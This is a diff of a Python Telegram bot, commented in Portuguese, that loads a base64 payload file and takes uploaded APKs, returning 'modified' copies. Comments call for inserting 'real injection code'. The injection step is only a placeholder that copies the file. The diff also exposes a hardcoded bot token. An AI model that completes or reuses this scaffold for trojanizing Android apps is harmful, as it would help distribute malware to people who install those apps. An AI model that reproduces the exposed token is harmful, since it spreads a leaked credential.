@@ -1,16 +1,15 @@
 import os
 import logging
 import base64
-import subprocess
 import tempfile
 import shutil
+import time
 from pathlib import Path
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
-from telegram.constants import ParseMode
 
 # ==================== CONFIGURAÇÃO ====================
-TOKEN =  "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A" # ← COLOQUE SEU TOKEN AQUI
+TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"
 PAYLOAD_FILE = "payload.b64"
 
 # ==================== LOGGING ====================
@@ -40,7 +39,7 @@ def load_payload():
         return payload_bytes
         
     except Exception as e:
-        logger.error(f"❌ Erro: {e}")
+        logger.error(f"❌ Erro ao carregar payload: {e}")
         return None
 
 # Carrega o payload
@@ -106,15 +105,14 @@ async def handle_apk(update: Update, context: CallbackContext):
         
         await update.message.reply_text("🔄 Processando...")
         
+        # ====================================================
         # AQUI VOCÊ COLOCA SEU CÓDIGO DE INJEÇÃO REAL
-        # Exemplo:
+        # ====================================================
+        
         output_path = tempfile.mktemp(suffix='_modified.apk')
         
-        # Simula processamento (substitua pelo seu código real)
-        import time
+        # Simulação (SUBSTITUA PELO SEU CÓDIGO REAL)
         time.sleep(3)
-        
-        # Copia o arquivo como exemplo
         shutil.copy2(input_path, output_path)
         
         await update.message.reply_text("✅ APK processado!")
@@ -122,15 +120,15 @@ async def handle_apk(update: Update, context: CallbackContext):
             await update.message.reply_document(
                 document=f,
                 filename=f'modified_{document.file_name}',
-                caption="✅ APK modificado!"
+                caption="✅ APK modificado com sucesso!"
             )
         
-        # Limpa arquivos
+        # Limpa arquivos temporários
         os.remove(input_path)
         os.remove(output_path)
         
     except Exception as e:
-        logger.error(f"Erro: {e}")
+        logger.error(f"Erro ao processar APK: {e}")
         await update.message.reply_text(f"❌ Erro: {str(e)[:200]}")
 
 async def button_callback(update: Update, context: CallbackContext):
@@ -144,13 +142,16 @@ async def button_callback(update: Update, context: CallbackContext):
 
 async def error_handler(update: Update, context: CallbackContext):
     logger.error(f"Erro: {context.error}")
+    if update and update.message:
+        await update.message.reply_text("❌ Ocorreu um erro inesperado.")
 
 # ==================== MAIN ====================
 def main():
     logger.info("🚀 Iniciando bot...")
+    logger.info(f"✅ TOKEN configurado: {TOKEN[:10]}...")
     
     if PAYLOAD is None:
-        logger.warning("⚠️ Payload não carregado!")
+        logger.warning("⚠️ Payload não carregado! O bot pode não funcionar corretamente.")
     else:
         logger.info(f"✅ Payload carregado: {len(PAYLOAD)} bytes")
     
@@ -161,7 +162,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_error_handler(error_handler)
     
-    logger.info("✅ Bot rodando...")
+    logger.info("✅ Bot rodando! Aguardando mensagens...")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
